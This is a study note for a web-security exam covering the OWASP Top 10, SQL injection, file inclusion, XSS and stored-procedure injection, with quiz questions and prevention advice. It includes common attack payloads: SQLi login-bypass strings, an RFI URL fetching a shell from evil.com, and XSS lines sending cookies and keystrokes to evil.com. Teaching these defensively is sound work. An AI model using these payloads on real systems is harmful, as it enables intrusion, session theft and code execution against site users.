# Session 1: OWASP Top 10, Injection, XSS & Stored Procedures

> **Exam Weight:** Core Topic | **Marks:** High | **Type:** Theory + Lab

---

## 1. OWASP Top 10 – 2021 (Complete List)

**OWASP** = Open Web Application Security Project. A nonprofit foundation that improves software security.

| Rank | Vulnerability | Key Risk |
|------|--------------|----------|
| A01 | **Broken Access Control** | Users acting outside intended permissions |
| A02 | **Cryptographic Failures** | Weak/missing encryption of sensitive data |
| A03 | **Injection** | SQLi, NoSQLi, OS command injection |
| A04 | **Insecure Design** | Missing security controls by design |
| A05 | **Security Misconfiguration** | Default configs, open cloud storage |
| A06 | **Vulnerable & Outdated Components** | Libraries with known CVEs |
| A07 | **Identification & Authentication Failures** | Weak passwords, broken sessions |
| A08 | **Software & Data Integrity Failures** | Insecure CI/CD pipelines, unsigned updates |
| A09 | **Security Logging & Monitoring Failures** | No detection of breaches |
| A10 | **Server-Side Request Forgery (SSRF)** | Server fetching unintended URLs |

> **Tricky Q:** In OWASP 2021, what replaced "Sensitive Data Exposure"?
> **A:** "Cryptographic Failures" (A02) — the name was changed to reflect the root cause.

> **Tricky Q:** Which was NEW in OWASP 2021 that wasn't in 2017?
> **A:** A04 – Insecure Design, A08 – Software & Data Integrity Failures, A10 – SSRF.

---

## 2. Injection Attacks

### 2.1 What is Injection?
Injection occurs when **untrusted data is sent to an interpreter** as part of a command or query.
The attacker's hostile data can trick the interpreter into executing unintended commands or accessing unauthorized data.

### 2.2 Types of Injection
- **SQL Injection** (SQLi) — most common
- **LDAP Injection**
- **OS Command Injection**
- **XML/XPath Injection**
- **NoSQL Injection** (MongoDB)
- **CRLF Injection**
- **Header Injection**

### 2.3 SQL Injection — Deep Dive

#### Classic SQLi
```sql
-- Login bypass: username = ' OR '1'='1
SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything';
-- '1'='1' is always TRUE → returns all rows → logged in!
```

#### Types of SQL Injection

| Type | How it works | Example Payload |
|------|-------------|-----------------|
| **In-Band / Classic** | Result comes back in same channel | `' OR 1=1--` |
| **Error-Based** | Forces DB to throw errors with data | `' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--` |
| **Union-Based** | Appends UNION to extract data | `' UNION SELECT null, username, password FROM users--` |
| **Blind – Boolean** | Asks True/False questions | `' AND 1=1--` vs `' AND 1=2--` |
| **Blind – Time-Based** | Infers data from response delay | `'; IF(1=1) WAITFOR DELAY '0:0:5'--` |
| **Out-of-Band** | Uses DNS/HTTP to exfiltrate | Uses `xp_dirtree` or `UTL_HTTP` |
| **Second-Order** | Payload stored, executed later | Stored in DB then used in another query |

#### Authentication Bypass Payloads
```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin' #
' OR 1=1--
" OR "1"="1
') OR ('1'='1
```

> **Tricky Q:** What is the difference between `--` and `#` in SQL injection?
> **A:** Both are comment syntax. `--` works in MySQL, MSSQL, Oracle. `#` works only in MySQL.

> **Tricky Q:** What is second-order SQL injection?
> **A:** Payload is stored in DB safely but later retrieved and used unsafely in another query without re-sanitization.

### 2.4 File Inclusion Attacks

#### Local File Inclusion (LFI)
- Attacker includes files **already on the server**
- URL: `http://example.com/page?file=../../../../etc/passwd`
- Can read `/etc/shadow`, config files, log files

#### Remote File Inclusion (RFI)
- Attacker includes files from **remote server**
- URL: `http://example.com/page?file=http://evil.com/shell.php`
- Can execute arbitrary code
- Requires `allow_url_include=On` in PHP

> **Tricky Q:** What PHP setting must be ON for RFI to work?
> **A:** `allow_url_include = On` in php.ini

> **Tricky Q:** LFI vs RFI — which is more dangerous and why?
> **A:** RFI is more dangerous as it allows direct code execution from attacker-controlled servers. LFI is limited to files already on the server.

---

## 3. Cross-Site Scripting (XSS)

### 3.1 What is XSS?
XSS allows attackers to **inject malicious scripts into web pages** viewed by other users. The browser trusts the page content and executes injected JavaScript.

### 3.2 Types of XSS

#### Reflected XSS (Non-Persistent)
- Script is reflected off the web server immediately
- Not stored in DB
- Requires victim to click a crafted link
- Example: `http://example.com/search?q=<script>alert(document.cookie)</script>`

#### Stored XSS (Persistent) — Most Dangerous
- Script is **stored in the database**
- Every user who views the page gets attacked
- Common in: comments, forums, profile fields
- Example: Storing `<script>document.location='http://evil.com/?c='+document.cookie</script>` in a comment

#### DOM-Based XSS
- Vulnerability is **in client-side JavaScript** itself
- Server never sees the payload
- Example: `document.write(location.hash.substring(1))`
- URL: `http://example.com/#<script>alert(1)</script>`

> **Tricky Q:** Which type of XSS does not require server-side vulnerability?
> **A:** DOM-based XSS — the vulnerability is in client-side JS code.

> **Tricky Q:** Can XSS be used even on HTTPS sites?
> **A:** Yes. XSS exploits trust in the page content, not the transport layer. HTTPS doesn't prevent XSS.

### 3.3 XSS Payloads (Common)
```javascript
// Basic alert (test)
<script>alert('XSS')</script>

// Cookie theft
<script>document.location='http://evil.com/?c='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){new Image().src='http://evil.com/?k='+e.key}</script>

// Bypassing filters (event handlers)
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<a href="javascript:alert(1)">click</a>
```

### 3.4 XSS Prevention
- **Input Validation** — whitelist allowed characters
- **Output Encoding** — HTML encode `<`, `>`, `"`, `'`, `&`
- **CSP (Content Security Policy)** — header that restricts script sources
- **HTTPOnly Cookie flag** — prevents JS from reading cookies
- **X-XSS-Protection header** — browser-level filter (deprecated in modern browsers)

---

## 4. Injection in Stored Procedures

### 4.1 What are Stored Procedures?
Pre-compiled SQL code stored in DB and called by name. Expected to be safer, but still vulnerable if parameters are concatenated.

### 4.2 Vulnerable Stored Procedure Example
```sql
-- VULNERABLE: String concatenation inside stored proc
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
BEGIN
    EXEC('SELECT * FROM Users WHERE username = ''' + @username + '''')
END
-- Attacker input: ' OR 1=1--
```

### 4.3 Safe Stored Procedure (Parameterized)
```sql
-- SAFE: Uses sp_executesql with typed parameter
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
BEGIN
    SELECT * FROM Users WHERE username = @username
END
-- Parameterized: no injection possible
```

> **Tricky Q:** Are stored procedures immune to SQL injection?
> **A:** NO. Stored procedures are vulnerable if they dynamically build SQL strings inside using concatenation. They are safe only when using parameterized queries.

> **Tricky Q:** What is the best defense against SQL injection?
> **A:** Parameterized queries / Prepared Statements (not input validation alone).

---

## 5. Quick Revision — Exam Cheatsheet

| Attack | Stored in DB? | Requires victim interaction? | Affects |
|--------|-------------|------------------------------|---------|
| Reflected XSS | No | Yes (click link) | Individual user |
| Stored XSS | Yes | No | All visitors |
| DOM XSS | No | Yes | Individual user |
| SQLi (Classic) | No | No | Database |
| SQLi (Stored) | Yes | No | All users |
| RFI | No | No | Server |
| LFI | No | No | Server files |

---

## 6. Tricky Exam Questions Bank

**Q1:** What OWASP category does "using a library with a known CVE" fall under?
**A:** A06 – Vulnerable and Outdated Components

**Q2:** Can `HttpOnly` flag prevent XSS attacks?
**A:** No. It prevents cookie theft via XSS but does NOT prevent XSS attacks themselves.

**Q3:** In a UNION-based SQLi, what must be true?
**A:** The number and data types of columns in both SELECT statements must match.

**Q4:** Which XSS type is hardest to detect with WAFs?
**A:** DOM-based XSS — payload never reaches the server.

**Q5:** What does OWASP stand for?
**A:** Open Web Application Security Project

**Q6:** Which injection type uses time delays to extract information?
**A:** Time-based Blind SQL Injection

**Q7:** What encoding prevents XSS?
**A:** HTML entity encoding (e.g., `<` → `&lt;`, `>` → `&gt;`)

**Q8:** What is the difference between authentication and authorization?
**A:** Authentication = who you are. Authorization = what you're allowed to do. Broken Access Control (A01) is an authorization failure.

---

*Next: Session 2 → DoS, Buffer Overflows, Access Control*
